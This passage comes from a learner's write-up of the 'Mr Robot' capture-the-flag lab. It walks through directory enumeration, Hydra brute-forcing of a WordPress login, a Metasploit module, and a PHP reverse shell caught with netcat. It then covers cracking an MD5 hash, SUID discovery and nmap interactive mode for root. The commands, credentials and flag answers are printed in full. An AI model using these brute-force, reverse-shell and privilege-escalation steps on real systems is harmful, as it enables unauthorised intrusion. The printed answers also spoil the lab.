+Dir found: /admin/js/vendor/ - 403
+Dir found: /blog/ - 403
+Dir found: /admin/images/ - 403
+Dir found: /admin/css/ - 403
+Dir found: /images/feed/ - 200
+File found: /index.php - 301
+Dir found: /wp-content/uploads/ - 403
+INFO: Retrying request
+Dir found: /js/vendor/feed/ - 200
+File found: /admin/js/vendor/vendor-48ca455c.js.pagespeed.jm.V7Qfw6bd5C.js - 200
+Dir found: /js/feed/ - 200
+Dir found: /image/1000/ - 200
+Dir found: /feed/feed/ - 301
+File found: /js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js - 200
+Dir found: /wp-content/uploads/2015/ - 403
+Dir found: /image/52510/ - 200
+File found: /admin/js/s_code.js.pagespeed.jm.I78cfHQpbQ.js - 200
+Dir found: /image/10485760/ - 200
+Dir found: /image/503/ - 200
+INFO: Retrying request
+File found: /admin/js/main-acba06a5.js.pagespeed.jm.YdSb2z1rih.js - 200
+DirBuster Stopped</code></pre><p id="738b2223-51fd-45e2-a0e2-4cfea4c0e9ea" class="">and the result is this and I see 2 files that are not contained or not in the folder which is the /index.php and /wp-login.php Now I find a directory that is suspicious because /wp-login.php is a login form So I tried to login there and I tried many usernames that are cast in to the TV series Mr. Robot I tried angela, krista, ron, darlene and finally elliot and it pop ups to the top that the username is right but the password is not So I tried burpsuite and in proxy I open the intercept and then I send the data to the intruder to load the fsocity.dic but the burpsuite is wasting my time because the intruder doing it 2 times and the burpsuite is eating my ram so I try hydra and this is the command</p><ul id="330cc88d-dba3-4b39-8560-0e0a4618ed3f" class="bulleted-list"><li style="list-style-type:disc">Before I do that I don’t want to scan all of the text in the file because it will take a long time because the line 858160 of text is so many. So I tried to sort the txt file in alphabetical order and I want to remove the duplicate word in this code so below here is a python code that will execute that sort</li></ul><pre id="8fbc46c4-3934-4080-a9fc-dcd96be79df0" class="code code-wrap"><code>def sort_and_remove_duplicates(file_path):
+    with open(file_path, &#x27;r&#x27;) as file:
+        # Read the contents of the file
+        text = file.read()
+
+    # Split the text into words
+    words = text.split(&quot;\n&quot;)
+
+    # Remove leading and trailing whitespaces from words
+    words = [word.strip() for word in words]
+
+    # Sort the words alphabetically
+    sorted_words = sorted(set(words))
+
+    # Join the sorted words back into a single text
+    sorted_text = &#x27;\n&#x27;.join(sorted_words)
+
+    return sorted_text
+
+# Example usage
+input_file_path = &#x27;fsocity.txt&#x27;
+output_file_path = &#x27;output.txt&#x27;
+
+sorted_text = sort_and_remove_duplicates(input_file_path)
+
+# Save the sorted text to a new file
+with open(output_file_path, &#x27;w&#x27;) as file:
+    file.write(sorted_text)
+
+print(output_file_path)</code></pre><ul id="7da61dbe-a86f-48d2-86e4-ab8eddf8ddf9" class="bulleted-list"><li style="list-style-type:disc">And I paste all of the text in output.txt to the terminal in my VM to do the hydra command</li></ul><pre id="8e7c2ea7-586f-4e56-9be0-bd08a6df3ce8" class="code code-wrap"><code>hydra -l &lt;username&gt; -P &lt;path&gt;/fsocity.dic &lt;ip&gt; -V http-form-post &#x27;/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location&#x27;</code></pre><p id="bd7379bf-a9d2-4b75-8f8f-a9e72763ea62" class="">and now I’m scanning 11452 of txt in the fsocity.dic this is the image of scanning</p><figure id="094f081a-cc15-4aa1-964e-fccce066a36f" class="image"><a href="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%205.png"><img style="width:1123px" src="Mr%20Robot%20c7b6b4ed9cb3413b90014d32061df64a/Untitled%205.png"/></a></figure><p id="e467f823-3c14-4778-8c20-c419288a4289" class="">and now this is the output</p><pre id="a45794a9-8eee-4890-b7de-a82ab344b54c" class="code code-wrap"><code>[80][http-post-form] host: 10.10.42.50   login: elliot   password: ER28-0652
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-25 23:31:31</code></pre><p id="5ce1fc5e-0cfd-43cf-8c4a-4f2a557470c2" class="">and now the password of elliot is ER28-0652</p><ul id="2f03f268-1c2e-404e-83b2-c802c953bbb7" class="bulleted-list"><li style="list-style-type:disc">I tried metasploit and wpscan here but I don’t have any clue what to do with them so I tried this is the command of the wpscan</li></ul><pre id="f432569a-9776-498d-b08a-6f4ced157398" class="code code-wrap"><code>$wpscan --url http://ip --api-token &lt;token&gt;</code></pre><p id="575745e2-7118-43e3-8ab1-f7c37ba8eadb" class="">
+</p><p id="2f4bac02-751e-44c1-8ebc-62741cba6c3c" class="">the &lt;token&gt; is a token that will be given at their website wpscan in the profile <a href="https://wpscan.com/profile">https://wpscan.com/profile</a> and the output is so many vulnerabilites in the WordPress and again I don’t have any idea what to do with it so I tried metasploit this is the command</p><pre id="9232bd2e-c16f-45f3-a215-adbf130982a2" class="code code-wrap"><code>$msfconsole 
+
+&quot;The output is so many so I filtered it the output has ID and you need to choose what you want to exploit and this is the prompt&quot; 
+
+$use &lt;id&gt; &quot;After that below is the next prompts&quot;
+
+[msf](Jobs:0 Agents:0) auxiliary(admin/http/wp_wplms_privilege_escalation) &gt;&gt; set RHOSTS 10.10.4.73
+RHOSTS =&gt; 10.10.4.73
+[msf](Jobs:0 Agents:0) auxiliary(admin/http/wp_wplms_privilege_escalation) &gt;&gt; set USERNAME elliot
+USERNAME =&gt; elliot
+[msf](Jobs:0 Agents:0) auxiliary(admin/http/wp_wplms_privilege_escalation) &gt;&gt; set PASSWORD ER28-0652
+PASSWORD =&gt; ER28-0652
+[msf](Jobs:0 Agents:0) auxiliary(admin/http/wp_wplms_privilege_escalation) &gt;&gt; run
+
+[*] Running module against 10.10.4.73
+[*] Authenticating with WordPress using elliot:ER28-0652...
+[+] Authenticated with WordPress
+[*] Changing admin e-mail address to eKYgI@VoFVc.com...
+[*] Enabling user registrations...
+[*] Setting the default user role...
+[+] Privilege escalation complete
+[+] Create a new account at /wp-login.php?action=register to gain admin access.
+[*] Auxiliary module execution completed</code></pre><ul id="c1257c31-3cb0-46a1-9d6c-fb65f3861a64" class="bulleted-list"><li style="list-style-type:disc">I tried to open the website to login again but the exploit is not functioning to gain the admin access to the website so it was a waste of time but I’ve gained experience to use these 2 tools metasploit and wpscan</li></ul><ul id="b13260ed-1235-4987-bb97-71ad87aa6a1d" class="bulleted-list"><li style="list-style-type:disc">As I explore the website I don’t have idea how to exploit the flag so I think if I inject some commands/code it will show me the flag and I see where I can inject those commands that is appearance/editor and if I inject  a the code at the archive.php something will happen and the link is below the pentestmonkey</li></ul><figure id="d34c4601-bb0d-46d7-b309-1d2b38f6fd67"><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">php-reverse-shell/php-reverse-shell.php at master · pentestmonkey/php-reverse-shell</div><div class="bookmark-description">Contribute to pentestmonkey/php-reverse-shell development by creating an account on GitHub.</div></div><div class="bookmark-href"><img src="https://github.com/fluidicon.png" class="icon bookmark-icon"/>https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</div></div><img src="https://opengraph.githubassets.com/c733773f6f6c9b7681ff8adb97c469fe75a993babee28ae9c6aa46c461dabc15/pentestmonkey/php-reverse-shell" class="bookmark-image"/></a></figure><ul id="2e6fdeb5-8e5d-495b-ac7d-8ceeac5840c6" class="bulleted-list"><li style="list-style-type:disc">I will change the ip to my tun0:inet IP and the port to 53 my DNS to do that I need to root my device and after that I created a new terminal and this is the code because I want to listen to the DNS</li></ul><ul id="384ceaa5-2f67-4c42-8f00-742d3045b853" class="bulleted-list"><li style="list-style-type:disc">And I will paste to my browser this url <a href="http://10.10.104.254/wp-content/themes/twentyfifteen/archive.php">http://&lt;tun0:ip&gt;/wp-content/themes/twentyfifteen/archive.php</a></li></ul><p id="b5f655bf-f015-4669-b69e-f3996a7dc50c" class="">So that I can listen something in my port 53</p><pre id="8699bd95-6708-4c88-a3f6-b222d3284f28" class="code code-wrap"><code>┌─[✗]─[drew@parrot]─[~/Desktop]
+└──╼ $sudo rlwrap nc -lvnp 53
+[sudo] password for drew: 
+listening on [any] 53 ...
+connect to [10.4.26.128] from (UNKNOWN) [10.10.104.254] 34269
+Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
+ 08:36:11 up 34 min,  0 users,  load average: 0.07, 0.06, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+/bin/sh: 0: can&#x27;t access tty; job control turned off
+whoami
+daemon
+$</code></pre><ul id="aaea4bd8-7e48-4412-9c4a-165bdc6ee738" class="bulleted-list"><li style="list-style-type:disc">And now I have the access </li></ul><pre id="d1b032b8-6a96-4a53-9540-be941bd15bd0" class="code code-wrap"><code>ls -a
+.
+..
+bin
+boot
+dev
+etc
+home
+initrd.img
+lib
+lib64
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+cd /
+cd home
+ls -a
+.
+..
+robot
+cd robot
+ls -a
+.
+..
+key-2-of-3.txt
+password.raw-md5
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b 
+&quot;An md5 and I decrypt it at https://md5.gromweb.com/ and this is the output 
+abcdefghijklmnopqrstuvwxyz &quot;</code></pre><ul id="7c5c4c87-59f4-4f6f-bfc3-557d3d37157d" class="bulleted-list"><li style="list-style-type:disc">I cant access the flag so I’ve research something how to get to the terminal and I see this command I will import a python code here the code is below and here is the link </li></ul><figure id="f3a75079-7a0b-4c7f-879e-af59ffca35a5"><a href="https://www.elastic.co/guide/en/security/7.17/interactive-terminal-spawned-via-python.html" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Interactive Terminal Spawned via Python | Elastic Security Solution [7.17] | Elastic</div></div><div class="bookmark-href"><img src="https://www.elastic.co/android-chrome-192x192.png" class="icon bookmark-icon"/>https://www.elastic.co/guide/en/security/7.17/interactive-terminal-spawned-via-python.html</div></div><img src="https://static-www.elastic.co/v3/assets/bltefdd0b53724fa2ce/blt280217a63b82a734/6202d3378b1f312528798412/elastic-logo.svg" class="bookmark-image"/></a></figure><pre id="5062f1bd-c62c-4c5a-999c-7316fd70a440" class="code code-wrap"><code>python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;
+su robot
+su robot
+abcdefghijklmnopqrstuvwxyz</code></pre><ul id="c13f6925-821f-4ab1-9036-52be2c6751d8" class="bulleted-list"><li style="list-style-type:disc">I import a python code to bring me to the terminal and I will input the password that I decrypt from md5 </li></ul><ul id="adff9d5e-81d1-4ebf-b1e8-f3332c9bdfcf" class="bulleted-list"><li style="list-style-type:disc">and I’m rooted now and the flag is there</li></ul><pre id="82f26bae-8820-4912-9b14-e5f12ea72b2f" class="code code-wrap"><code>ls -a
+.  ..  key-2-of-3.txt  password.raw-md5
+cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$</code></pre><p id="32836784-a2d0-4aa2-baca-42e0611428d9" class="">ANSWER : 822c73956184f694993bede3eb39f959</p><h2 id="a2878bda-cfb4-4cec-92a5-becf98220a3c" class="">What is key 3?</h2><ul id="5dfb9322-b9ae-4258-a978-65a78ef2c763" class="bulleted-list"><li style="list-style-type:disc">To find the root process I tried LinPeas here and sudo -l  but failed I tried this and I want to filter it to only see that containing the word bin</li></ul><pre id="e0d940f5-ee06-4dc4-bbe3-b5774b53d286" class="code code-wrap"><code>find / -perm +6000 2&gt;/dev/null | grep &#x27;/bin/&#x27;
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/mail-touchlock
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/screen
+/usr/bin/mail-unlock
+/usr/bin/mail-lock
+/usr/bin/chsh
+/usr/bin/crontab
+/usr/bin/chfn
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/expiry
+/usr/bin/dotlockfile
+/usr/bin/sudo
+/usr/bin/ssh-agent
+/usr/bin/wall
+/usr/local/bin/nmap</code></pre><ul id="c84ef3f5-3e47-4a3f-a9c1-b6fa8f72cd4d" class="bulleted-list"><li style="list-style-type:disc">And out of suspicion I see the vulnerability of nmap when I look at these website </li></ul><figure id="182f3695-68bd-43cd-af98-dba787667a23"><a href="https://gtfobins.github.io/gtfobins/nmap/#non-interactive-reverse-shell" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">nmap
+            
+            |
+            
+            GTFOBins</div></div><div class="bookmark-href"><img src="https://gtfobins.github.io/assets/logo.png" class="icon bookmark-icon"/>https://gtfobins.github.io/gtfobins/nmap/#non-interactive-reverse-shell</div></div></a></figure><p id="61d5b735-3d1c-42bb-a13d-70cd136f518b" class="">so that I can execute shell commands</p><pre id="153ba669-8f41-4226-a84c-c4487d669beb" class="code code-wrap"><code>$nmap --interactive
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+!sh
+!sh
+ls
+ls
+key-2-of-3.txt	password.raw-md5
+cd /root
+cd /root
+ls -a
+ls -a
+.   .bash_history  .cache	   key-3-of-3.txt  .rnd
+..  .bashrc	   firstboot_done  .profile
+cat key-3-of-3.txt
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4</code></pre><p id="d49005b2-9b5b-4171-987d-a1896f7413fc" class="">and lastly I don’t know why the terminal always show the commands 2 times </p><p id="c5163406-ff4a-482b-a3e6-e834931ba185" class="">
+ANSWER : 04787ddef27c3dee1ee161b21670b4e4</p><p id="f1be43e1-7a2e-413a-98b3-3fdc83fa2246" class="">
+</p><h3 id="d84a7ca8-1f18-4008-aaed-b1f2ee36593c" class="">The process</h3></div></details><hr id="886b9969-4a16-4880-8d3f-ab60f49a5676"/></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
